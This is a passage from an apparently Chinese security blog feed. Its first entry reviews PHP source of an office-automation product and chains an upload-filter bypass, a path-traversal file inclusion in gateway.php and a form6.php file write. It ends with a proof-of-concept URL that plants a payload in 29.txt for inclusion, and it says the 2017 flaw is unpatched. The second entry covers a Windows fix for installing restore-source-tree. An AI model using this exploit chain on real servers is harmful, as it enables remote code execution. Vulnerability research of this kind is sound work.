function_ invoke__">preg_match</span>(<span class="string">&quot;/[^0-9,]+/&quot;</span>, <span class="variable">$ids</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$ids</code>为<code>get</code>传入的<code>ids</code>值，PHP中没有进行赋值的变量的值为<code>NULL</code>，此时的<code>!preg_match(&quot;/[^0-9,]+/&quot;, $ids)</code>为<code>false</code>而<code>DEST_UID</code>我们可以通过<code>POST</code>操作，因此绕过了这个判断</p><p>继续往下看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$DEST_UID</span>, <span class="string">&quot;,&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$DEST_UID</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$DEST_UID</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$DEST_UID</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$UPLOAD_MODE</span> != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="variable">$dataBack</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;-ERR &quot;</span> . <span class="title function_ invoke__">_</span>(<span class="string">&quot;接收方ID无效&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="title function_ invoke__">data2utf8</span>(<span class="variable">$dataBack</span>));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>DEST_UID </code>中存在有<code>,</code>，则通过<code>intval</code>获取整数值；最后当<code>$DEST_UID=0</code>时，<code>UPLOAD_MODE</code>要为2 否接收方ID无效。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$MODULE</span> = <span class="string">&quot;im&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= <span class="title function_ invoke__">count</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$UPLOAD_MODE</span> == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;ATTACHMENT&quot;</span>][<span class="string">&quot;name&quot;</span>])) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;ATTACHMENT&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;ATTACHMENT&quot;</span>][<span class="string">&quot;name&quot;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;ATTACHMENT&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ATTACHMENTS</span> = <span class="title function_ invoke__">upload</span>(<span class="string">&quot;ATTACHMENT&quot;</span>, <span class="variable">$MODULE</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$ATTACHMENTS</span>)) &#123;</span><br><span class="line"><span class="variable">$dataBack</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;-ERR &quot;</span> . <span class="variable">$ATTACHMENTS</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="title function_ invoke__">data2utf8</span>(<span class="variable">$dataBack</span>));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_FILES</code>全局变量大于等于1的时候(就是有文件上传的时候)，会调用<code>upload</code>方法进行处理，这里的文件上传的参数为<code>ATTACHMENT</code></p><p>跟进<code>upload</code>方法后发现了文件名合法性校验函数<code>is_uploadable</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span>(<span class="params"><span class="variable">$FILE_NAME</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$POS</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$FILE_NAME</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$POS</span> === <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable">$EXT_NAME</span> = <span class="variable">$FILE_NAME</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$FILE_NAME</span>, <span class="variable">$POS</span> + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">&quot;php&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$EXT_NAME</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$FILE_NAME</span>, <span class="variable">$POS</span> + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>strrpos</code> 函数获取<code>.</code>最后一次出现的位置开始到后面的3个字符串，不能为<code>php</code>，基于黑名单的绕过方式有很多，不再赘述。</p><h1 id="V11文件包含"><a href="#V11文件包含" class="headerlink" title="V11文件包含"></a>V11文件包含</h1><p>路径：<code>ispirit\interface\gateway.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/session.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility_org.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z0-9;]+/i&quot;</span>, <span class="variable">$P</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;非法参数&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="variable">$P</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_ID&quot;</span>] == <span class="string">&quot;&quot;</span>) || (<span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_UID&quot;</span>] == <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;RELOGIN&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要不传入P参数即可绕过，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$json</span>) &#123;</span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">stripcslashes</span>(<span class="variable">$json</span>);</span><br><span class="line"><span class="variable">$json</span> = (<span class="keyword">array</span>) <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$json</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;data&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$val</span> = (<span class="keyword">array</span>) <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$keys</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line"><span class="variable">$keys</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;url&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&quot;general/&quot;</span>) !== <span class="literal">false</span>) || (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&quot;ispirit/&quot;</span>) !== <span class="literal">false</span>) || (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&quot;module/&quot;</span>) !== <span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$url</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入<code>json</code>参数，其中包含<code>url</code>参数且<code>url</code>中包含<code>general\</code>、<code>ispirit\</code>、<code>module\</code>其一即可，<code>url</code>通过跨目录方式可以包含通过文件上传漏洞上传的包含恶意代码的文件造成命令执行。</p><h1 id="2017文件包含（官方无补丁，仅有文件上传补丁）"><a href="#2017文件包含（官方无补丁，仅有文件上传补丁）" class="headerlink" title="2017文件包含（官方无补丁，仅有文件上传补丁）"></a>2017文件包含（官方无补丁，仅有文件上传补丁）</h1><p>文件路径：<code>mac\gateway.php</code></p><p>原理同上，但是利用方式更为简单</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/session.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility_org.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z0-9;]+/i&quot;</span>, <span class="variable">$P</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;非法参数&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="variable">$P</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_ID&quot;</span>] == <span class="string">&quot;&quot;</span>) || (<span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_UID&quot;</span>] == <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;RELOGIN&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$json</span>) &#123;</span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">stripcslashes</span>(<span class="variable">$json</span>);</span><br><span class="line"><span class="variable">$json</span> = (<span class="keyword">array</span>) <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$json</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;data&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$val</span> = (<span class="keyword">array</span>) <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$keys</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line"><span class="variable">$keys</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;url&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$url</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="拿下2017的另一个思路"><a href="#拿下2017的另一个思路" class="headerlink" title="拿下2017的另一个思路"></a>拿下2017的另一个思路</h1><p>官方发布了任意文件上传的补丁，并且部分WAF拦截了形如<code>../../</code>跨目录方式，无法包含<code>nginx</code>日志，是否意味着无法用包含玩了呢？</p><p>通过一番寻找，发现了一处利用官方文件<strong>合法</strong>写入并包含的点</p><p>涉及到的文件路径<code>general/workflow/document_list/input_form/form6.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot; src=\&quot;/inc/js/jquery/jquery.min.js.jz\&quot;&gt;&lt;/script&gt;\r\n&lt;script&gt; \r\nfunction click_main_doc_op(op)\r\n&#123;\r\n\t   if(op == \&quot;1\&quot;)\r\n\t   &#123;    \r\n\t\t $(\&quot;tr_addfile\&quot;).style.display = &#x27;&#x27;;    \r\n       &#125;else\r\n\t    &#123;\t \r\n\t\t $(\&quot;tr_addfile\&quot;).style.display = &#x27;none&#x27;;    \r\n\t    &#125;\r\n&#125;\r\nfunction check()&#123;\r\n\talert();\r\n&#125;\r\n\r\n&lt;/script&gt;\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$MAINDOC_ID</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;29.txt&quot;</span>, <span class="variable">$MAINDOC_ID</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;document_attach.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> .= <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;table class=\&quot;TableBlock\&quot; width=\&quot;95%\&quot; align=\&quot;center\&quot;&gt;\r\n  &lt;tr&gt;\r\n  \t&lt;td class=\&quot;TableHeader\&quot; colspan=\&quot;2\&quot;&gt;创建正文文件&lt;/b&gt;\r\n  &lt;/tr&gt;\r\n  &lt;/tr&gt;\r\n  &lt;tr id=\&quot;maindoc\&quot;&gt;\r\n  \t&lt;td class=\&quot;TableData\&quot; width=\&quot;120\&quot;&gt;&lt;b&gt;创建方式：&lt;/b&gt;&lt;/td&gt;\r\n  \t&lt;td class=\&quot;TableData\&quot;&gt;\r\n  \t   &lt;input type=\&quot;radio\&quot; name=\&quot;MAIN_DOC_OP\&quot; id=\&quot;MAIN_DOC_OP_1\&quot; value=\&quot;1\&quot; onclick=\&quot;click_main_doc_op(this.value)\&quot;&gt;&lt;label for=\&quot;MAIN_DOC_OP_1\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;上传本地文件&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/label&gt;\r\n  \t   &lt;input type=\&quot;radio\&quot; name=\&quot;MAIN_DOC_OP\&quot; id=\&quot;MAIN_DOC_OP_2\&quot; value=\&quot;2\&quot; onclick=\&quot;click_main_doc_op(this.value)\&quot;&gt;&lt;label for=\&quot;MAIN_DOC_OP_2\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;新建空文件&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/label&gt;\r\n        &lt;input type=\&quot;button\&quot;  id=\&quot;MAIN_DOC_OP\&quot; value=\&quot;确定\&quot; class=\&quot;SmaillButton\&quot; onclick=\&quot;CheckForm(15);\&quot; &gt;\r\n  \t&lt;/td&gt;\r\n  &lt;/tr&gt;\r\n  &lt;tr id=\&quot;tr_addfile\&quot; style=\&quot;display:none;\&quot;&gt;\r\n  \t&lt;td class=\&quot;TableData\&quot;&gt;&lt;b&gt;选择本地文件：&lt;/b&gt;&lt;/td&gt;\r\n  \t&lt;td class=\&quot;TableData\&quot; &gt;\r\n  \t   &lt;input type=\&quot;file\&quot; class=\&quot;BigInput\&quot; name=\&quot;MAIN_DOC_FILE\&quot; size=40&gt;\r\n  \t&lt;/td&gt;\r\n  &lt;/tr&gt;\r\n&lt;/table&gt;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于这套程序存在变量覆盖，因此通过<code>gateway.php</code>包含该文件并传入<code>MAINDOC_ID</code>即可，POC：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mac/gateway.php?json=&#123;&quot;url&quot;:&quot;../general/workflow/document_list/input_form/form6.php&quot;&#125;&amp;MAINDOC_ID=PAYLOAD</span><br></pre></td></tr></table></figure><p>然后就会在<code>/mac</code>目录下生成<code>29.txt</code>，然后包含即可</p><p><img src="/images/image-20200321004604561.png" alt="image-20200321004604561"></p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>还原JS Map文件</title>
      <link href="/p/17ec.html"/>
      <url>/p/17ec.html</url>
      
        <content type="html"><![CDATA[<p>做项目时发现一个站点为前后分离的架构，翻了下发现了map文件，采用<code>restore-source-tree</code>还原时报错，记录下解决过程</p><span id="more"></span><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>先从git克隆到本地</p><p><code>git clone https://github.com/laysent/restore-source-tree.git</code></p><p>然后进入文件夹</p><p><code>npm install</code></p><p>这里建议挂个代理、VPN，国内很慢</p><p>这里在win下会报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">λ npm cinstall                                                                                                                                                            </span><br><span class="line">npm WARN deprecated babel-preset-es2015@6.24.1: �  Thanks for using Babel: we recommend using babel-preset-env now: please read https://babeljs.io/env to update!         </span><br><span class="line">npm WARN deprecated core-js@2.6.11: core-js@&lt;3 is no longer maintained and not recommended for usage due to the number of issues. Please, upgrade your dependencies to the</span><br><span class="line">ctual version of core-js@3.                                                                                                                                               </span><br><span class="line">npm WARN deprecated circular-json@0.3.3: CircularJSON is in maintenance only, flatted is its successor.                                                                   </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">core-js@2.6.11 postinstall C:\Users\Administrator\Desktop\qubu\restore-source-tree\node_modules\core-js</span>                                                                 </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">node -e <span class="string">&quot;try&#123;require(&#x27;./postinstall&#x27;)&#125;catch(e)&#123;&#125;&quot;</span></span>                                                                                                                       </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Thank you for using core-js ( https://github.com/zloirock/core-js ) for polyfilling JavaScript standard library!                                                          </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">The project needs your help! Please consider supporting of core-js on Open Collective or Patreon:                                                                         </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">https://opencollective.com/core-js</span>                                                                                                                                      </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">https://www.patreon.com/zloirock</span>                                                                                                                                        </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Also, the author of core-js ( https://github.com/zloirock ) is looking for a good job -)                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm WARN prepublish-on-install As of npm@5, `prepublish` scripts are deprecated.                                                                                          </span><br><span class="line">npm WARN prepublish-on-install Use `prepare` for build steps and `prepublishOnly` for upload-only.                                                                        </span><br><span class="line">npm WARN prepublish-on-install See the deprecation note in `npm help scripts` for more information.                                                                       </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">restore-source-tree@0.1.1 prepublish C:\Users\Administrator\Desktop\qubu\restore-source-tree</span>                                                                            </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">npm run build</span>                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">restore-source-tree@0.1.1 build C:\Users\Administrator\Desktop\qubu\restore-source-tree</span>                                                                                 </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">NODE_ENV=production babel index.js --out-file dist.js</span>                                                                                                                   </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">&#x27;NODE_ENV&#x27; is not recognized as an internal or external command,                                                                                                          </span><br><span class="line">operable program or batch file.                                                                                                                                           </span><br><span class="line">npm ERR! code ELIFECYCLE                                                                                                                                                  </span><br><span class="line">npm ERR! errno 1                                                                                                                                                          </span><br><span class="line">npm ERR! restore-source-tree@0.1.1 build: `NODE_ENV=production babel index.js --out-file dist.js`                                                                         </span><br><span class="line">npm ERR! Exit status 1                                                                                                                                                    </span><br><span class="line">npm ERR!                                                                                                                                                                  </span><br><span class="line">npm ERR! Failed at the restore-source-tree@0.1.1 build script.                                                                                                            </span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.                                                                        </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm ERR! A complete log of this run can be found in:                                                                                                                      </span><br><span class="line">npm ERR!     C:\Users\Administrator\AppData\Roaming\npm-cache\_logs\2020-03-13T08_30_28_330Z-debug.log                                                                    </span><br><span class="line">npm ERR! code ELIFECYCLE                                                                                                                                                  </span><br><span class="line">npm ERR! errno 1                                                                                                                                                          </span><br><span class="line">npm ERR! restore-source-tree@0.1.1 prepublish: `npm run build`                                                                                                            </span><br><span class="line">npm ERR! Exit status 1                                                                                                                                                    </span><br><span class="line">npm ERR!                                                                                                                                                                  </span><br><span class="line">npm ERR! Failed at the restore-source-tree@0.1.1 prepublish script.                                                                                                       </span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.                                                                        </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm ERR! A complete log of this run can be found in:                                                                                                                      </span><br><span class="line">npm ERR!     C:\Users\Administrator\AppData\Roaming\npm-cache\_logs\2020-03-13T08_30_28_406Z-debug.log                                                                    </span><br></pre></td></tr></table></figure><p><code>&#39;NODE_ENV&#39; is not recognized as an internal or external command,operable program or batch file.  </code></p><p>跨平台缘故，<code>NODE_ENV</code>为<code>*nix</code>环境变量，安装<code>cross-env</code>包然后修改</p><p><code>npm install -g cross-env</code></p><p>目录下面的<code>package.json</code>中的<code>&quot;build&quot;: &quot;NODE_ENV=production babel index.js --out-file dist.js&quot;,</code>为<code>&quot;build&quot;: &quot;cross-env NODE_ENV=production babel index.js --out-file dist.js&quot;,</code></p><p>修改后完整如下</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;restore-source-tree&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Restores file structure from source map&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bin&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;restore-source-tree&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bin/restore-source-tree.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env NODE_ENV=production babel index.js --out-file dist.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prepublish&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm run build&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alexander &lt;alexkuz@gmail.com&gt; (http://kuzya.org/)&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;commander&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.9.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;glob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;minimist&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mkdirp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.5.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;source-map&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.5.6&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;babel-cli&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.11.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;babel-eslint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.1.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span 